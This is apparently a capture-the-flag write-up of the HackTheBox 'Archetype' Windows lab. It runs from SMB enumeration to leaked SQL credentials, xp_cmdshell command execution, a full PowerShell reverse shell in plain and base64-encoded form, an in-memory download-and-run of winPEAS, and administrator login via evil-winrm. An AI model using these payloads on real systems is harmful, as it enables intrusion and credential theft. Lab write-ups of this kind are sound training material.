---
title: HackTheBox Archetype Writeup
date: 2026-09-13
tags: ["Archetype | Windows", "Reconnaissance", "Initial Access", "Lateral Movement", "Post Exploitation", "Local Enumeration", "Privilege Escalation", "Conclusion"]
draft: false
---

# Archetype | Windows
This documentation attempts to explain the path to full system compromise on the 'Archetype' machine, from an exposed SMB share through a misconfigured MS SQL server to administrator privileges. Tools and techniques employed are detailed throughout.

## *Reconnaissance*
The very initial step is getting a network perspective of the machine using `nmap`.

```Bash
┌──(kali㉿kali)-[~/PersonalProjos/HackTheBox/machines/Archetype]
└─$ sudo nmap -sV -sC <target-IP>                                          
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-03 00:40 -0400
Nmap scan report for 10.129.95.187
Host is up (0.14s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-info: 
|   <target-IP>:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-09-03T04:28:57
|_Not valid after:  2056-09-03T04:28:57
|_ssl-date: 2026-09-03T04:48:11+00:00; +1s from scanner time.
| ms-sql-ntlm-info: 
|   <target-IP>:1433: 
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-09-02T21:48:02-07:00
| smb2-time: 
|   date: 2026-09-03T04:48:01
|_  start_date: N/A
|_clock-skew: mean: 1h24m01s, deviation: 3h07m51s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 462.30 seconds
```

*The scan results show that the mssql(port 1433) and smb services(ports 139 & 445) are running on the target. (alongside other ports)*
*Other 'juicy' details include, the OS(a Windows Server 2019 machine), anonymous SMB access is available, there's an unpatched mssql server(post-sp updates not applied) and the port for winRM is open*

## *Initial Access*
Began by enumerating the smb port to gather details about the service. `smbmap` is best for a quick overview, listing shares and viewing permissions.

```Bash
┌──(kali㉿kali)-[~/PersonalProjos/HackTheBox/machines/Archetype]
└─$ smbmap -H 10.129.95.187 -u "guest"

[SNIP]

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                
[+] IP: <target-IP>:445       Name: <target-IP>             Status: Authenticated

Disk                                            Permissions     Comment
----                                            -----------     -------
ADMIN$                                          NO ACCESS       Remote Admin
backups                                         READ ONLY
C$                                              NO ACCESS       Default share
IPC$                                            READ ONLY       Remote IPC
[*] Closed 1 connections 
```

Knowing which shares were readable, I used `smbclient` to connect to the share and look at its contents.

```Bash
┌──(kali㉿kali)-[~/PersonalProjos/HackTheBox/machines/Archetype]
└─$ smbclient //<target-IP>/backups -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

5056511 blocks of size 4096. 2617733 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
smb: \> exit
┌──(kali㉿kali)-[~/PersonalProjos/HackTheBox/machines/Archetype]
└─$ ls
prod.dtsConfig
```

*Note: I did not probe the `IPC$` share as it does not hold actual browsable files, IPC stands for Inter-Process Communication, allows processes to communicate between machines.*

Examining the downloaded file, I was able to view plaintext credentials for the user `ARCHETYPE/sql_svc`.

```Bash
┌──(kali㉿kali)-[~/PersonalProjos/HackTheBox/machines/Archetype]
└─$ cat prod.dtsConfig
<DTSConfiguration>

[SNIP]
	<ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

*Password: M3g4c0rp123*

## *Lateral Movement*
At this step, I used the retrieved credentials to authenticate and interact with the mssql service via Impacket's mssqlclient.

```Bash
┌──(kali㉿kali)-[~/PersonalProjos/HackTheBox/machines/Archetype]
└─$ impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@<target-IP> -windows-auth
/usr/lib/python3/dist-packages/impacket/mssql/version.py:182: SyntaxWarning: 'return' in a 'finally' block
  return string
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)> help

lcd {path}                 - changes the current local directory to {path}
exit                       - terminates the server process (and this session)
enable_xp_cmdshell         - you know what it means

[SNIP]
```

With access to the service, the next thing to do was enabling command execution on the host OS through the ms sql service.

```
SQL (ARCHETYPE\sql_svc  dbo@master)> enable_xp_cmdshell
INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "whoami"
output              
-----------------   
archetype\sql_svc   
NULL
```

*`xp_cmdshell` is a built-in feature of Microsoft SQL server that acts as a bridge between the database and the (underlying) Windows OS, it passes the string to `cmd.exe` which executes it and prints the output in the SQL session.*

## *Post-Exploitation*
Having gained command execution, I aimed at getting a terminal session on the target by triggering a reverse shell.

*Reverse shell payload*
```PowerShell
xp_cmdshell "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('<target-IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"" 
```

To avoid a quoting hell, I encoded the payload in base64 format, powershell does the heavy lifting. MSSQL takes the command and passes it to `cmd.exe` which passes it to powershell, each of these layers has its own set of conflicting rules sorrounding single & double quotes, using an encoded payload gets around all this.

```Bash
xp_cmdshell "powershell -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA1AC4AMgAzADgAJwAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

I set a listener on my Local machine to "catch" the connection and get a shell.

```Bash
┌──(kali㉿kali)-[~/PersonalProjos/HackTheBox/machines/Archetype]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [<target-IP>] from (UNKNOWN) [<target-IP>] 49677
ls


    Directory: C:\Windows\system32


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        9/15/2018   2:06 AM                0409                                                                  
d-----        1/19/2020   3:09 PM                1033                                                                  
d-----        7/27/2021   2:28 AM                AdvancedInstallers

[SNIP]
```



## *Local Enumeration*
With shell access, The object was to enumerate the target to gather information that will aid in privilege escalation. To do this, I used the `winPEAS.ps1` script.

- Script download.
```Bash
┌──(kali㉿kali)-[~/PersonalProjos/HackTheBox/machines/Archetype]
└─$ wget https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1
--2026-09-07 02:41:08--  https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 94970 (93K) [text/plain]
Saving to: ‘winPEAS.ps1’

winPEAS.ps1                       100%[==========================================================>]  92.74K   496KB/s    in 0.2s    

2026-09-07 02:41:09 (496 KB/s) - ‘winPEAS.ps1’ saved [94970/94970]

┌──(kali㉿kali)-[~/PersonalProjos/HackTheBox/machines/Archetype]
└─$ ls
prod.dtsConfig  winPEAS.ps1
```

- Script Execution.
```Bash
PS C:\Windows\system32> powershell -c "IEX (New-Object Net.WebClient).downloadString('http://<tun0-address>:8080/winPEAS.ps1') | Out-File -FilePath C:\Windows\Temp\winPEAS_output.txt"

```
...

*While working on this section, specifically attempting enumeration through `winPEAS` scripts, my efforts were mostly futile. I tried running the files in memory using PowerShell's `Invoke-Expression` but the command would just hang, I wasn't(and still not) sure if it was due to lack of the required privileges, that aside, I couldn't even write into any folder except(`C:\Users\sql_svc`). I later tried to download the files from my local machine using `Invoke-WebRequest`, they would download just fine but running them wasn't successful.
As a last ditch effort, I resorted to reading Hack The Box's official writeup and I noticed something, the author had used `winPEASx64.exe`, an executable written in C#, I wasn't sure if this was the key but I hoped it was considering I had been trying to enumerate using the `.ps1` & `.bat` versions. 
The executable run just fine, among the torrent of output, I noticed the path to PowerShell history file, knowing that it had the administrators credentials, I had attained my object.*

```PowerShell
[SNIP]

???????????? PowerShell Settings (T1059.001)
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 79B

```

```PowerShell
PS C:\Users\sql_svc> type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
PS C:\Users\sql_svc>
```

*Administrator Credentials:*
- Username: administrator
- Passwd: MEGACORP_4dm1n!!

#### *Privilege Escalation*
Having discovered the admin credentials, I used them to get a privileged PowerShell Session using `evil-winrm`.

```Bash
┌──(kali㉿kali)-[~/PersonalProjos/HackTheBox/machines/Archetype]
└─$ evil-winrm -i 10.129.95.187 -u administrator -p 'MEGACORP_4dm1n!!'
 
Evil-WinRM shell v3.9
 
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

With system-wide access, the final object was finding the flags for the `sql_svc` user and the administrator.

```PowerShell
*Evil-WinRM* PS C:\Users\Administrator> Get-ChildItem -Path C:\Users\sql_svc\Desktop


    Directory: C:\Users\sql_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/25/2020   6:37 AM             32 user.txt

```

```PowerShell
*Evil-WinRM* PS C:\Users\Administrator> Get-Content -Path C:\Users\sql_svc\Desktop\user.txt
3e7b102e78218e935bf3f4951fec21a3
```

```PowerShell
*Evil-WinRM* PS C:\Users\Administrator> Get-ChildItem -Path C:\Users\Administrator\Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/25/2020   6:36 AM             32 root.txt

```

```PowerShell
*Evil-WinRM* PS C:\Users\Administrator> Get-Content -Path C:\Users\Administrator\Desktop\root.txt
b91ccec3305e98240082d4474b848528
```



# Conclusion.
This machine showcases how service misconfiguration(and "bad housekeeping") can lead to system compromise. Service credentials were left in a readable file in a publicly accessible share, this gave an initial foothold on the system which allowed me to further enumerate the system and discover the administrator credentials.
